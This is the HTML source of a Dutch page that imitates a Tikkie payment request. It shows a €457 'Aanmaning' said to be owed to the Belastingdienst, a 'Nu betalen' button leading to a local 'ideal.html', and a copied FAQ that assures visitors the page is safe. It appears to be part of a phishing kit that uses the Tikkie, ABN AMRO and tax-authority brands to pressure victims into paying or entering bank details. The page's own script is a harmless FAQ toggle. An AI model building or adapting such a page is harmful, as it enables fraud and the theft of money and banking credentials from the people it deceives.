<!DOCTYPE html>
<html lang="nl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Betaalverzoekjes via Tikkie</title>
    <link rel="stylesheet" href="tikkie.css">
    <link rel="icon" type="image/png" href="tikkie logo's/favicon.png">
</head>
<body>
    <header class="header">
        <span class="betaal-text"><b>Betaal via</b></span>
        <img src="tikkie logo's/logo-tikkie.png" alt="Tikkie Logo" class="logo">
    </header>
    
    <main class="container">
        <h1>Aanmaning</h1>
        <div class="belastingdienst-container">
            <span class="belastingdienst-text"><b>Naar Belastingdienst</b></span>
            <div class="checkmark-logo">
                <img src="tikkie logo's/checkmark.svg" alt="Checkmark Logo">
            </div>
        </div>
        
        <h1 class="prijs">€ 457,00</h1>
        
        <div class="add-message"><b>+ Berichtje toevoegen?</b></div>
        
        <a href="ideal.html" class="btn" id="payButton">
            <img src="tikkie logo's/ideal-logo.svg" alt="iDEAL Logo" class="btn-icon">
            <b>Nu betalen</b>
        </a>
        
        <div class="voorwaarden">
            <p class="grijs"><b>Door Tikkie te gebruiken ga je akkoord met de</b></p>
            <p class="wit"><b>Algemene voorwaarden</b></p>
        </div>
    </main>
    
    <section class="questions">
        <p><b>Heb je nog vragen?</b></p>
    </section>
    
    <section class="faq">
        <button class="how-it-works">
            <p><b>Hoe werkt het?</b></p>
            <img src="tikkie logo's/arrow-down-white.svg" alt="Pijl" class="arrow-icon">
            <div class="extra-content">
                <p>Betalen regel je snel in een paar stappen:</p>
                <ol>
                    <li>Bovenaan deze pagina kies je je eigen bank.</li>
                    <li>Je logt in bij je eigen bank, zoals je dat altijd doet.</li>
                    <li>Je checkt de gegevens van de betaling, die zijn al voor je ingevuld.</li>
                    <li>Je bevestigt de betaling op de manier die bij jouw bank gebruikelijk is.</li>
                    <li>Klaar! Appeltje eitje toch?</li>
                </ol>
            </div>
        </button>
        
        <button class="how-it-works">
            <p><b>Is Tikkie voor iedereen?</b></p>
            <img src="tikkie logo's/arrow-down-white.svg" alt="Pijl" class="arrow-icon">
            <div class="extra-content">
                <p>Ja, iedereen met een Nederlandse betaalrekening kan Tikkie gebruiken. Het maakt niet uit bij welke bank je zit. Je betaalt altijd eenvoudig via je eigen bank met iDEAL.</p>
            </div>
        </button>
        
        <button class="how-it-works">
            <p><b>Is Tikkie veilig?</b></p>
            <img src="tikkie logo's/arrow-down-white.svg" alt="Pijl" class="arrow-icon">
            <div class="extra-content">
                <p>Tikkie is mogelijk gemaakt door ABN AMRO en voldoet aan strenge veiligheidseisen. De link begint met https. Dit betekent dat je gegevens versleuteld zijn. Een Tikkie betaalverzoekje ziet er altijd zo uit: https://tikkie.me/pay/... Als dit niet zo is, klik er dan niet op en <span class="blauw"><b>misbruik melden</b></span>.</p>
            </div>
        </button>
        
        <button class="how-it-works">
            <p><b>Heb ik mijn paslezer nodig om te betalen?</b></p>
            <img src="tikkie logo's/arrow-down-white.svg" alt="Pijl" class="arrow-icon">
            <div class="extra-content">
                <p>Bij de meeste banken kun je in je mobiel bankieren-app instellen of je tot een bepaald bedrag zonder paslezer wilt betalen. Soms is het nodig om de paslezer alleen bij de eerste betaling aan een vriend te gebruiken.</p>
            </div>
        </button>
        
        <button class="how-it-works">
            <p><b>Is het gratis?</b></p>
            <img src="tikkie logo's/arrow-down-white.svg" alt="Pijl" class="arrow-icon">
            <div class="extra-content">
                <p>We rekenen geen transactiekosten voor de betalingen via iDEAL.</p>
            </div>
        </button>
        
        <button class="how-it-works">
            <p><b>Waarom zie ik een onbekende rekening?</b></p>
            <img src="tikkie logo's/arrow-down-white.svg" alt="Pijl" class="arrow-icon">
            <div class="extra-content">
                <p>Je betaling gaat eerst naar een tussenrekening van ABN AMRO. Vanuit die rekening boeken we het bedrag over naar de ontvanger.</p>
            </div>
        </button>
        
        <button class="how-it-works">
            <p><b>Misbruik melden</b></p>
            <img src="tikkie logo's/arrow-down-white.svg" alt="Pijl" class="arrow-icon">
            <div class="extra-content">
                <p>Als je echt het idee hebt dat het verzoekje niet oké is, kun je hier <span class="blauw"><b>misbruik melden</b></span>. In de <span class="blauw"><b>privacyverklaring</b></span> lees je hier meer over.</p>
            </div>
        </button>
    </section>
    
    <section class="questions">
        <p><b>Kom je er niet uit?</b></p>
    </section>
    
    <button type="button" class="btn">
        <img src="tikkie logo's/chat.png" alt="Chat Icon" class="btn-icon">
        <b>App met Tikkie</b>
    </button>
    
    <footer class="footer">
        <div class="footer-left">
            <span><b>Algemene Voorwaarden</b></span>  
            <span><b>Privacy</b></span>
        </div>
        <div class="footer-right">
            <span><b>&copy; Tikkie</b></span>
        </div>
    </footer>

    <script>
        // Selecteer alle knoppen
        const buttons = document.querySelectorAll('.how-it-works');

        buttons.forEach(button => {
            button.addEventListener('click', () => {
                // Verwijder de 'open' klasse van andere knoppen
                buttons.forEach(btn => {
                    if (btn !== button) {
                        btn.classList.remove('open');
                    }
                });

                // Toggle de 'open' klasse van de geklikte knop
                button.classList.toggle('open');
            });
        });
    </script>
</body>
</html>
